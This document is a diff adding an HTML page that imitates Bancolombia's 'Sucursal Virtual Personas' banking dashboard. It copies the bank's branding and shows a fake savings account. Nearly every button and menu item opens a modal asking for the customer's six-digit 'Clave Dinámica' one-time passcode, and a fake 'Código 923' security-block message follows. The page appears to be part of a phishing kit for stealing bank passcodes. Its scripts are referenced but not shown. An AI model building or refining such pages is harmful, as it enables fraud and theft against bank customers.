@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bancolombia Sucursal Virtual Personas</title>
+  <link rel="stylesheet" href="css/dashboard.css">
+  <link rel="stylesheet" href="css/secured.css">
+  <style>
+    /* Sobreescribimos: el body del dashboard tiene su propio layout */
+    body {
+      background: #f9f9fa;
+    }
+  </style>
+</head>
+
+<body>
+
+  <header class="top">
+    <button class="menu-btn" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+        <line x1="4" y1="7" x2="20" y2="7" />
+        <line x1="4" y1="12" x2="20" y2="12" />
+        <line x1="4" y1="17" x2="20" y2="17" />
+      </svg>
+      <span>Menú</span>
+    </button>
+    <div class="brand">
+      <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
+      <div class="channel">Sucursal Virtual Personas</div>
+    </div>
+    <div class="top-actions">
+      <button class="top-action search-pill" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <circle cx="11" cy="11" r="7" />
+          <line x1="21" y1="21" x2="16.5" y2="16.5" />
+        </svg>
+        <span>Buscar</span>
+      </button>
+      <button class="top-action" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <circle cx="12" cy="12" r="10" />
+          <path d="M9.5 9a2.5 2.5 0 015 0c0 1.5-2.5 2-2.5 3.5" />
+          <line x1="12" y1="17" x2="12.01" y2="17" />
+        </svg>
+        <span>Ayuda</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <polyline points="6 9 12 15 18 9" />
+        </svg>
+      </button>
+      <button class="user-pill" onclick="openDinModal()">
+        <span id="userName">Usuario</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <polyline points="6 9 12 15 18 9" />
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <div class="layout">
+    <aside class="sidebar">
+      <div class="nav-item active" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"
+          stroke-linejoin="round">
+          <path d="M3 11l9-7 9 7v9a1 1 0 01-1 1h-5v-6h-6v6H4a1 1 0 01-1-1z" />
+          <rect x="8.5" y="13" width="7" height="3" rx="0.5" />
+        </svg>
+        Inicio
+      </div>
+      <div class="nav-item" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"
+          stroke-linejoin="round">
+          <path d="M9 5h6l1 3H8l1-3z" />
+          <path d="M7 8h10c2 4 3 7 3 10a4 4 0 01-4 4H8a4 4 0 01-4-4c0-3 1-6 3-10z" />
+          <path d="M12 12v6M10 14h3a1.5 1.5 0 010 3h-3M10 14v6" />
+        </svg>
+        Productos
+      </div>
+      <div class="nav-item" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"
+          stroke-linejoin="round">
+          <rect x="2" y="6" width="20" height="13" rx="2" />
+          <line x1="2" y1="11" x2="22" y2="11" />
+          <rect x="6" y="14" width="4" height="2.5" rx="0.3" />
+        </svg>
+        Transacciones
+      </div>
+      <div class="nav-item" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"
+          stroke-linejoin="round">
+          <path d="M9 11V5.5a1.5 1.5 0 113 0V11" />
+          <path d="M12 10V3.5a1.5 1.5 0 113 0V11" />
+          <path
+            d="M15 11V5a1.5 1.5 0 113 0v8a7 7 0 01-7 7H9.5a3.5 3.5 0 01-3.5-3.5v-2L4 12.5a1.5 1.5 0 012.4-1.8L8 12.5" />
+          <circle cx="14" cy="3" r="1.3" fill="currentColor" />
+        </svg>
+        Solicitudes
+      </div>
+      <div class="nav-item" onclick="openDinModal()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7" />
+          <line x1="4" y1="12" x2="20" y2="12" />
+          <line x1="4" y1="17" x2="20" y2="17" />
+        </svg>
+        Más
+      </div>
+    </aside>
+
+    <main class="content">
+      <div class="page-header">
+        <div></div>
+        <div id="currentDate"></div>
+      </div>
+
+      <div class="greeting">
+        <h1>Hola, <strong id="greetingName">Usuario</strong></h1>
+        <button class="icon-btn" onclick="openDinModal()" aria-label="Personalizar nombre">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 20h9" />
+            <path d="M16.5 3.5a2.121 2.121 0 113 3L7 19l-4 1 1-4 12.5-12.5z" />
+          </svg>
+        </button>
+      </div>
+
+      <section class="block">
+        <h2>Transacciones más usadas</h2>
+        <div class="shortcuts" id="shortcuts">
+          <div class="shortcut-card" onclick="openDinModal()">
+            <div class="shortcut-icon"><img src="img/imgi_4_pic-send-money-from.svg" alt=""></div>
+            <h6>Transferir a productos Bancolombia</h6>
+          </div>
+          <div class="shortcut-card" onclick="openDinModal()">
+            <div class="shortcut-icon"><img src="img/imgi_5_pic-lock.svg" alt=""></div>
+            <h6>Editar topes</h6>
+          </div>
+          <div class="shortcut-card" onclick="openDinModal()">
+            <div class="shortcut-icon"><img src="img/imgi_6_pic-invoice.svg" alt=""></div>
+            <h6>Pagar facturas</h6>
+          </div>
+          <div class="shortcut-card" onclick="openDinModal()">
+            <div class="shortcut-icon"><img src="img/imgi_7_pic-wallet.svg" alt=""></div>
+            <h6>Ir a Bolsillos</h6>
+          </div>
+          <div class="shortcut-card" onclick="openDinModal()">
+            <div class="shortcut-icon"><img src="img/imgi_8_pic-documents.svg" alt=""></div>
+            <h6>Consultar extractos</h6>
+          </div>
+        </div>
+      </section>
+
+      <section class="block">
+        <div class="products-header">
+          <h2>Tus productos</h2>
+          <div class="toggle-balance" id="toggleBalance">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+              <circle cx="12" cy="12" r="3" />
+              <line x1="3" y1="3" x2="21" y2="21" />
+            </svg>
+            <span id="toggleText">Mostrar saldos</span>
+          </div>
+        </div>
+
+        <div class="accordion open" id="acc1">
+          <div class="accordion-header" onclick="document.getElementById('acc1').classList.toggle('open')">
+            <svg class="icon-coin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+              stroke-linecap="round" stroke-linejoin="round">
+              <ellipse cx="12" cy="7" rx="8" ry="3" />
+              <path d="M4 7v4c0 1.7 3.6 3 8 3s8-1.3 8-3V7" />
+              <path d="M4 11v4c0 1.7 3.6 3 8 3s8-1.3 8-3v-4" />
+              <path d="M4 15v2c0 1.7 3.6 3 8 3s8-1.3 8-3v-2" />
+            </svg>
+            <h6>Cuentas (1)</h6>
+            <svg class="accordion-toggle" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+              stroke-width="2.5" stroke-linecap="round">
+              <polyline points="6 9 12 15 18 9" />
+            </svg>
+          </div>
+          <div class="accordion-body">
+            <div class="product-row">
+              <div class="product-info" onclick="openDinModal()">
+                <div class="name">Cuenta de Ahorros</div>
+                <div class="number">Ahorros 770 - 988723 - 13</div>
+              </div>
+              <div class="product-balance">
+                <div class="label">Saldo disponible</div>
+                <div class="amount skeleton" id="balance">Cargando</div>
+              </div>
+              <button class="product-menu" onclick="openDinModal()" aria-label="Opciones">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                  <circle cx="5" cy="12" r="1.5" />
+                  <circle cx="12" cy="12" r="1.5" />
+                  <circle cx="19" cy="12" r="1.5" />
+                </svg>
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="block">
+        <h2>Te recomendamos</h2>
+        <div class="recommendations">
+          <div class="rec-card">
+            <div class="rec-img"><img src="img/imgi_9_S5aR7DFEugr5hTo1e6LP.jpg" alt="Plan Salud"></div>
+            <div class="rec-body">
+              <h3>Plan Salud Para Ti</h3>
+              <p>Cuídate desde $39,900 al mes</p>
+              <button class="btn-secondary" onclick="openDinModal()">Pide tu seguro</button>
+            </div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-img"><img src="img/imgi_11_p5iPJNLs4amUF65XT1XF.jpg" alt="Acumula kilómetros"></div>
+            <div class="rec-body">
+              <h3>Acumula kilómetros</h3>
+              <p>Pagando con tu Mastercard</p>
+              <button class="btn-secondary" onclick="openDinModal()">Inscríbete</button>
+            </div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-img"><img src="img/imgi_10_MQHcDg4Nx7zMqW827eqD.png" alt="Vendes tu casa"></div>
+            <div class="rec-body">
+              <h3>¿Vendes tu casa?</h3>
+              <p>Hazlo con Tu360Inmobiliario</p>
+              <button class="btn-secondary" onclick="openDinModal()">Empieza aquí</button>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <footer>
+    <div class="footer-left">
+      <img src="img/horizont-trazo.svg" alt="Bancolombia" onerror="this.style.display='none'">
+      <div class="vigilado">
+        <div class="vigilado-circle">SFC</div>
+        <span>Vigilado Superintendencia Financiera</span>
+      </div>
+    </div>
+    <div class="footer-right">
+      <div>Dirección IP: <span id="ipAddr">190.68.206.206</span></div>
+      <div>Última visita: <span id="lastVisit"></span></div>
+    </div>
+  </footer>
+
+  <button class="comente-tab" onclick="openDinModal()">Comente</button>
+<!-- Loader -->
+<div class="loader-overlay" id="loader">
+  <div class="loader-box">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Cargando...</div>
+  </div>
+</div>
+
+  <!-- Modal Clave Dinámica -->
+  <div class="modal-overlay" id="dinModal">
+    <div class="modal-din">
+      <button class="modal-close" onclick="closeDinModal()" aria-label="Cerrar">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <line x1="18" y1="6" x2="6" y2="18" />
+          <line x1="6" y1="6" x2="18" y2="18" />
+        </svg>
+      </button>
+      <img class="hint-gif" src="img/imgi_4_cd-desktop.gif" alt="Cómo encontrar tu Clave Dinámica"
+        onerror="this.style.display='none'">
+      <h3>Ingresa la Clave Dinámica</h3>
+      <p class="modal-sub">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+      <div class="otp-error" id="otpError">Clave Dinámica incorrecta. Intenta de nuevo.</div>
+      <div class="otp-inputs" id="otpInputs">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+      </div>
+      <div class="modal-actions">
+        <button class="btn-pill btn-secondary-pill" onclick="din.clear()">Borrar</button>
+        <button class="btn-pill btn-primary" id="btnContinue" disabled>Continuar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal 923 -->
+  <div class="modal-overlay" id="modal923">
+    <div class="modal-923">
+      <div class="x-circle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+          <line x1="18" y1="6" x2="6" y2="18" />
+          <line x1="6" y1="6" x2="18" y2="18" />
+        </svg>
+      </div>
+      <h3>Por seguridad, no puedes continuar</h3>
+      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica,
+        elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad. Codigo: 923</p>
+      <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
+    </div>
+  </div>
+
+
+  <script src="js/secured.js"></script>
+  <script src="js/dashboard.js"></script>
+</body>
+
+</html>
